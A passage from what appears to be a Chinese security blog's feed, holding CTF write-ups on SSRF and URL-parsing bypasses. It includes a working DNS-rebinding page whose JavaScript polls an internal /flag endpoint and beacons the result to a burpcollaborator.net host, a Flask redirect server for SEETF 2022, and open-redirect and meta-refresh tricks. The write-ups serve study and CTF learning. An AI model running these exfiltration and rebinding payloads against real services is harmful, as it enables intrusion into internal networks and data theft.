+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;noflag&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">debug&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>index.html&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://7f000001.6523726b.rbndr.us:2301&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">setInterval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">count&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">/flag`&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">navigator&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendBeacon&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://p1rdfk5o171n2esbrk8mdxx58wer2g.burpcollaborator.net/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">responseText&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">count&lt;/span> &lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span> &lt;span style="color:#ae81ff">20000&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当解析到我们自己的恶意server时，index.html页面上的js脚本会不停的发送XHR请求到&lt;code>${host}/flag&lt;/code>，某一个时刻恰好host被解析成127.0.0.1，就可以得到flag并把结果发送到我们自己的webhook地址了&lt;/p>
+&lt;h3 id="seetf-2022super-secure-requests-forwarder">[SEETF 2022]Super Secure Requests Forwarder&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">redirect&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">i&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Nothing to see here&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://localhost/flag&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="实战思路">实战思路&lt;/h2>
+&lt;ul>
+&lt;li>重定向至其它子域&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>https://xx.xxx.com/User/Login?redirect=http://xxx.com/
+&lt;/code>&lt;/pre>&lt;p>检测不严时，可以改为abcxxx.com&lt;/p>
+&lt;ul>
+&lt;li>与xss有关&lt;/li>
+&lt;/ul>
+&lt;p>构造基于meta的重定向&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">meta&lt;/span> &lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1;url=http://www.baidu.com&amp;#34;&lt;/span> &lt;span style="color:#75af00">http-equiv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;refresh&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>一群常见的绕过&lt;/li>
+&lt;/ul>
+&lt;p>请参见&lt;a href="https://tttang.com/archive/1290/">Make Redirection Evil Again: URL Parser Issues in OAuth&lt;/a>，写的很不错，这里不复制了（&lt;/p>
+&lt;hr>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
+&lt;/h4>
+&lt;/summary>
+&lt;p>&lt;a href="https://www.cnblogs.com/tr1ple/p/11137159.html">parse_url小结&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.cnblogs.com/tr1ple/p/11139832.html">SSRF和XSS-filter_var(), preg_match() 和 parse_url()绕过学习&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://bbs.pediy.com/thread-272848.htm">[原创] 看雪 2022 KCTF 春季赛 第四题 飞蛾扑火&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://toutiao.io/posts/kuvr3yy/preview">浅谈 URL 协议&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://t.zsxq.com/VFeyjie">parse_url.pdf&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://github.com/terjanq/Flag-Capture/tree/master/MeePwn%202018/omega#omegasector--write-up-by-terjanq">OmegaSector – write-up by @terjanq&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">PHP SSRF Techniques How to bypass filter_var(), preg_match() and parse_url()&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://mp.weixin.qq.com/s/SysCJTcYRpV6dj9QfeQYmQ">利用 URN 绕过 URL 检查&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://xz.aliyun.com/t/10039">Eclipse Jetty WEB-INF敏感信息泄露漏洞分析（CVE-2021-28164/CVE-2021-34429）&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://chybeta.github.io/2018/08/20/Ruby-on-Rails-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-3760%E3%80%91/">Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://xz.aliyun.com/t/3302">Django URL跳转漏洞分析（CVE-2018-14574 ）&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://xz.aliyun.com/t/5189">浅析渗透实战中url跳转漏洞&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://tttang.com/archive/1290/">Make Redirection Evil Again: URL Parser Issues in OAuth&lt;/a>&lt;/p>
+&lt;/details></description></item><item><title>Java学习笔记Ⅴ</title><link>https://amiaaaz.github.io/2022/05/30/java-study-notes-05/</link><pubDate>Mon, 30 May 2022 23:20:41 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/30/java-study-notes-05/</guid><description>&lt;p>各路博客没少看，踩的坑怎么还超级多呢……所有参考链接附在文末&lt;/p>
 &lt;hr>
 &lt;blockquote>
 &lt;p>本文涉及到的Java环境&amp;amp;相关依赖，仅供参考：&lt;/p>
